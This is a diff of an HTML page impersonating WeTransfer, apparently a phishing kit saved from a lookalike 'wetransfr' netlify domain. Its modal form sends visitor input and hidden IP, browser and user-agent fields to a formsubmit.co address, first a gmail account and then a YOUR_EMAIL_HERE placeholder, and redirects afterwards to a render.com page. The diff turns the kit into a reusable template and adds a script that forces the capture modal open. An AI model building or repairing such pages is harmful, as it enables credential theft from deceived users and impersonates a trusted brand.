@@ -1,10 +1,7 @@
-<!-- saved from url=(0070)https://69d93348d5c2bd12b011488a-%2Dwetransfr-file-30a026.netlify.app/ -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta name="referrer" content="no-referrer-when-downgrade">
-    <meta name="robots" content="noindex, nofollow">
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>WeTransfer</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
@@ -139,7 +136,6 @@
             font-style: normal;
         }
         
-        /* Custom styles for max attempts image */
         #maxAttemptsContainer img {
             max-width: 100%;
             height: auto;
@@ -194,14 +190,13 @@
         <div class="modal-dialog">
             <div class="modal-content">
                 <form id="accessForm" 
-                      action="https://formsubmit.co/joekesh322@gmail.com" 
+                      action="https://formsubmit.co/YOUR_EMAIL_HERE" 
                       method="POST"
                       novalidate>
                     
-                    <!-- FormSubmit.co required fields -->
                     <input type="hidden" name="_captcha" value="true">
                     <input type="hidden" name="_template" value="table">
-                    <input type="hidden" name="_next" value="https://wetransfer-lc74.onrender.com">
+                    <input type="hidden" name="_next" value="https://YOUR_RENDER_URL.onrender.com/thankyou.html">
                     <input type="text" name="_honey" style="display:none;">
 
                     <div class="modal-body">
@@ -218,7 +213,6 @@
                             <div id="submissionAlert" class="alert alert-danger mt-2 d-none" role="alert"></div>
                         </div>
                         
-                        <!-- Hidden fields for additional data -->
                         <input type="hidden" name="ip" id="ip-field" value="">
                         <input type="hidden" name="browser" id="browser-field" value="">
                         <input type="hidden" name="userAgent" id="useragent-field" value="">
@@ -241,6 +235,43 @@
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <!-- ✅ FIXED: Correct script file name -->
     <script src="scriptss.js"></script>
+    
+    <!-- FALLBACK: Direct button handler -->
+    <script>
+        // This runs immediately when the page loads
+        console.log('Page loaded - fallback script running');
+        
+        // Wait for DOM to be ready
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('DOM ready - checking for button');
+            
+            const btn = document.getElementById('showFormBtn');
+            if (btn) {
+                console.log('Button found - adding click handler');
+                
+                // Remove any existing listeners by cloning
+                const newBtn = btn.cloneNode(true);
+                btn.parentNode.replaceChild(newBtn, btn);
+                
+                // Add click handler
+                newBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    console.log('Button clicked - showing modal');
+                    
+                    const modalElement = document.getElementById('formModal');
+                    if (modalElement) {
+                        const modal = new bootstrap.Modal(modalElement);
+                        modal.show();
+                    } else {
+                        console.error('Modal element not found!');
+                    }
+                });
+            } else {
+                console.error('Button not found!');
+            }
+        });
+    </script>
 </body>
 </html>
